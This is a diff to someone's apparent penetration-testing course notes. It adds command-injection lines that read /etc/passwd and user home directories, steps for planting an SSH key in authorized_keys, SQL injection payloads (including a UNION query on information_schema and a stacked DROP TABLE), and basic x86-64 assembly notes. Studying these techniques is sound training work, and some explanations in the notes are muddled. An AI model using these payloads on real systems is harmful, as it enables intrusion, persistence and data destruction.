@@ -190,10 +190,17 @@ Ability to read/execute outside web server’s directory
 Uses ../../ (relative paths) in manipulating a server-side file path
 view_image.php?file=../../etc/passwd
 Use ; to run commands
+; ls 
 ; whoami
 ; cat ../../../../etc/passwd
 ; cat ../../../../etc/hosts
-; cat ../../../../etc/profiles
+; cat ../../../../etc/profiles (can run without root privs)
+
+you can do more than simple commands on directory Traversal but it doesn't save changes unless its a key
+; pwd (check current directory)
+; ls /home (check common area for users on server)
+; ls /home/* ( check any interesting locations)
+; cat /home/* ( cat the interesting location to see if it is valuable)
 
 Malicious File upload
 
@@ -233,12 +240,141 @@ find users home directory
 ; cat /etc/passwd
 
 Create directory for .ssh key 
-; mkdir var/www/.ssh
+; mkdir var/www/.ssh ( the . in ssh makes it invisible to directories ) 
 
 echo ssh onto authorized keys
 echo "key" >> /var/www/.ssh/authorized_keys
 
 try ssh process again for test if it doesn't work
+
+
+SQL Commands
+
+show tables from session;
+- shows table format of session
+select * from session.car;
+- shows everything from the car table in the session table
+
+Union needs an even amount of columns to from both tables in order to work
+Example: Car has 5 columns and inside the cars table it has tires with 3 column, you need to pad 2 extra columns in order for SQL to print
+SELECT * FROM car UNION SELECT tireid,name,size,cost,1,2 FROM Tires;
+
+
+ TOM' OR 1='1 (trying to probe SQL for information about it system)
+if statement is true will return everything
+Situationsal awareness
+ps -ef ( shows processes )
+
+
+' is unsanitized and will determine how vulnerable the SQL you are testing is.
+
+Stacking Statements
+
+Chaining multiple statements together using a semi-colon ;
+
+
+SELECT * FROM user WHERE id=‘Johnny'; DROP TABLE Customers; --’
+Nesting statements
+
+
+Some Web Application + SQL Database combinations do not allow stacking, such as PHP and MySQL.
+
+
+Though they may allow for nesting a statement within an existing one:
+
+
+php?key=<value> UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'
+Ignore the rest
+
+Using # or -- tells the Database to ignore everything after
+
+
+Server-Side Query:
+
+SELECT product FROM item WHERE id = $select limit 1;
+
+
+Input to Inject:
+
+1 or 1=1; #
+
+
+Stacking Statements
+Chaining multiple statements together using a semi-colon ; 
+SELECT * FROM user WHERE id=‘Johnny'; DROP TABLE Customers; --’
+
+Using # or -- tells the Database to ignore everything after
+
+@@version shows version on GET request (Might be on the test)
+
+REVERSE ENGINEERING
+registers hold values for certain datasets
+general register tells you where the stuff you need is
+stack holds all registers
+heap allocates space 
+
+X86_64 Assembly - Common Instruction Pointer
+MOV
+move source to destination
+PUSH
+push source onto stack
+POP
+Pop top of stack to destination
+INC
+Increment source by 1
+DEC
+Decrement source by 1
+ADD
+Add source to destination
+SUB
+Subtract source from destination
+CMP
+Compare 2 values by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same.
+JMP
+Jump to specified location
+JLE
+Jump if less than or equal
+JE	
+Jump if equal
+
+
+
+Static
+
+Behavioral
+
+Dynamic
+
+Disassembly
+
+Document Findings
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
